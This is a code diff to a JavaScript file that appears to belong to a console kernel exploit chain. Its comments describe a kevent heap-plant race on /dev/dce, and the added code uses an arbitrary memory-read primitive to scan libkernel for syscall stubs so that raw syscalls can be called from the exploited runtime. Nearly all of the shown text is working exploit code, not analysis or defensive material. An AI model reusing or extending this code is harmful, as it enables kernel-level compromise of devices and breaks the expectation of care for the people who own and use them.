@@ -8,7 +8,8 @@ import { HX1400_TABLES } from "./hx_tables.js";
 //   candidate: marked() -> open("/dev/dce",O_RDWR) -> kevent(-18 plant) ->
 //   scan victims for [8]==(int)page && [12]==0 -> joined==1 -> replant
 //   flags=2 -> HELD. kevent(-23) is one-time setup AFTER this (pc 9108),
-//   NOT per attempt. dce is the /dev/dce FD; page=((dce&0xffff)<<16)|0x985a.
+//   NOT per attempt. dce = the /dev/dce FD; page=((dce&0xffff)<<16)|0x985a.
+// v3: runtime libkernel rescan for stubs the stage-1 scanner missed (open=5).
 // ============================================================================
 
 const T = HX1400_TABLES;
@@ -55,6 +56,41 @@ function toI64(v) {
 }
 function ka(rva) { return STATE.kbase + BigInt(rva >>> 0); }
 
+// --- stub resolution: stage-1 map -> runtime libkernel rescan fallback ---
+// Orbis syscall stub shape: mov w8|x8, #num ; svc #0 ; ret
+const SVC_INS = 0xd4000001;
+function findStubRaw(snum) {
+  const p = ctx().p;
+  const base = num(ctx().libkernelBase);
+  const movW = (0x52800000 | ((snum & 0xffff) << 5) | 8) >>> 0;
+  const movX = (0xd2800000 | ((snum & 0xffff) << 5) | 8) >>> 0;
+  const LIMIT = 0x20000; // first 128KB of libkernel (stub section lives early)
+  for (let off = 0; off < LIMIT; off += 4) {
+    const w = p.read4(toI64(base + BigInt(off))) >>> 0;
+    if (w === movW || w === movX) {
+      for (let k = 1; k <= 3; k++) {
+        if ((p.read4(toI64(base + BigInt(off + 4 * k))) >>> 0) === SVC_INS)
+          return base + BigInt(off);
+      }
+    }
+  }
+  return null;
+}
+
+function ensureStubs() {
+  const missing = Object.keys(NUM).filter((k) => !ctx().stubAddr.has(NUM[k]));
+  for (const k of missing) {
+    const addr = findStubRaw(NUM[k]);
+    if (addr !== null) {
+      ctx().stubAddr.set(NUM[k], toI64(addr));
+      log("NATIVES-RESCAN", k + "=" + NUM[k] + "@0x" + addr.toString(16));
+    }
+  }
+  const still = Object.keys(NUM).filter((k) => !ctx().stubAddr.has(NUM[k]));
+  if (still.length)
+    fin("stubs missing: " + still.map((k) => k + "=" + NUM[k]).join(" ") + " (rescan failed)");
+}
+
 function scn(name, a, b, c, d, e, f) {
   const n = NUM[name];
   const stub = ctx().stubAddr.get(n);
@@ -79,8 +115,6 @@ function allocBuf(size) {
   ARENAS.push({ ab, dv, addr: num(c.bufAddr(ab)) });
   return ARENAS[ARENAS.length - 1];
 }
-function put64(buf, off, v) { buf.dv.setUint32(off, Number(num(v) & 0xffffffffn), true); buf.dv.setUint32(off + 4, Number((num(v) >> 32n) & 0xffffffffn), true); }
-function put16(buf, off, v) { buf.dv.setUint16(off, v & 0xffff, true); }
 function zeroBuf(buf) { new Uint8Array(buf.ab).fill(0); }
 
 // ---------- stage-2 primitives (bytecode-exact) ----------
@@ -229,11 +263,9 @@ export async function runKevent(c) {
 
   const magic = ctx().p.read4(toI64(ctx().libkernelBase)) >>> 0;
   log("NATIVES-PROBE", "elf_magic=0x" + magic.toString(16) + " (0x464c457f=headers-mapped)");
-  const need = Object.keys(NUM);
-  const missing = need.filter((k) => !ctx().stubAddr.has(NUM[k]));
-  if (missing.length)
-    fin("stubs missing: " + missing.map((k) => k + "=" + NUM[k]).join(" "));
-  log("NATIVES", need.map((k) => k + "=" + NUM[k] + "@0x" +
+
+  ensureStubs();
+  log("NATIVES", Object.keys(NUM).map((k) => k + "=" + NUM[k] + "@0x" +
       num(ctx().stubAddr.get(NUM[k])).toString(16)).join(" "));
 
   const scratch16a = allocBuf(16), scratch16b = allocBuf(16);
